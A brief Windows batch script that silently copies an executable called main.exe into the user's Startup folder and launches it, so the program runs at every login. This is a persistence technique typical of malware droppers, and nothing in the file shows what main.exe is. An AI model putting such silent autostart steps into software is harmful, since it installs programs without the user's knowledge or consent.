@echo off

copy "%CD%/main.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
pushd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
start "" main.exe
popd
exit